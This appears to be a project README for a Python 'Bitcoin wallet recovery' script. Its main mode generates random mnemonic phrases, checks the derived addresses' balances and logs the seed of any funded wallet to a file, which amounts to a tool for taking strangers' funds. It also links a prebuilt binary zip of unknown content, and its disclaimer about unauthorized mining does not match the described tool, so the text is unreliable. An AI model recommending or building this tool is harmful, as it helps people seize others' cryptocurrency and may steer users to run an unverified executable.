# Bitcoin Wallet Recovery Tool

Updated
![Bitcoin Wallet Recovery](https://imgur.com/pZOi3Dw.png)



## Overview

This Python script is designed to recover Bitcoin wallet addresses from mnemonic phrases and check their balances using multiple threads. It utilizes the BIP32 protocol for hierarchical deterministic wallets. The script generates mnemonic phrases, derives wallet addresses, and queries the blockchain API to check balances. If a non-zero balance is found, it logs the details to a file named "wallet.txt".

## Disclaimer
⚠️ Disclaimer ⚠️

This script is developed for educational and research purposes only.

By using this code, you agree to the following:

- You will not use this code, in whole or in part, for malicious intent, including but not limited to unauthorized mining on third-party systems.
- You will seek explicit permission from any and all system owners before running or deploying this code.
- You understand the implications of running mining software on hardware, including the potential for increased wear and power consumption.
- The creator of this script cannot and will not be held responsible for any damages, repercussions, or any negative outcomes that result from using this script.
- If you do not agree to these terms, please do not use or distribute this code.


## Features

- **Mnemonic Phrase Generation**: The script generates random mnemonic phrases of 12 words using the English language.
- **BIP32 Wallet Derivation**: It utilizes the BIP32 protocol to derive Bitcoin wallet addresses from mnemonic phrases. BIP32 enables the creation of hierarchical deterministic wallets, allowing for the generation of a tree-like structure of keys from a single seed.
- **Balance Checking**: The script queries the blockchain.info API to check the Bitcoin balance of derived wallet addresses.
- **Concurrent Processing**: To optimize performance, the script uses multiple threads via ThreadPoolExecutor for concurrent processing of mnemonic phrases.
- **Wallet Recovery from Partial Mnemonic**: The script includes an option to recover a wallet from a partial mnemonic phrase provided by the user. It iterates through possible combinations of missing words and attempts to recover the wallet.

## Prerequisites

- Python 3.x
- Required Python packages: `mnemonic`, `bip32utils`, `requests`

## Installation

1. Clone the repository or download the source code.
2. Navigate to the project directory.
3. Install the required packages using pip:

```
pip install -r requirements.txt
```


## Usage

1. Run the `recover.py` script:

```
python recover.py
```
Or binary: https://github.com/panosdd123/bitcoin-restore/releases/download/btc/btc-recover.zip

2. Follow the on-screen prompts to choose between recovering a wallet from a partial mnemonic or checking random wallets.
3. If you choose to recover a wallet from a partial mnemonic, enter the words you remember from your mnemonic phrase, separated by spaces.
4. If you choose to check random wallets, the script will generate random mnemonic phrases and check the corresponding wallet balances.
5. If a wallet with a non-zero balance is found, the script will log the mnemonic phrase, wallet address, and balance to the `wallet.txt` file.


## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request.

## Star 🌟

Don't forget to star and watch the repo for updates. Your support is greatly appreciated!
